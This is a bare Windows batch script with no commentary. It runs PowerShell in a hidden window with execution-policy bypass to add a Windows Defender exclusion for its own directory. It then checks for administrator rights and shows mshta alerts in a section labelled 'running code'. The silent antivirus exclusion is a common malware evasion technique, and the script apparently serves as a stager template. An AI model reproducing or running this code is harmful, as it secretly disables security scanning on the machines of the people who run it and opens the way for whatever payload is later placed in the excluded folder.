@echo off
setlocal
set "AREA=%cd%"
powershell -w hidden -ep bypass -command "Add-MpPreference -ExclusionPath '%AREA%\'"
timeout /t 3 /nobreak >nul
REM ================================================================
REM running code
REM ================================================================
net session >nul 2>&1
if %errorLevel% == 0 (
    mshta "javascript:alert('Running as Administrator');close()"
) else (
    mshta "javascript:alert('NOT running as Administrator');close()"
)
REM ================================================================
endlocal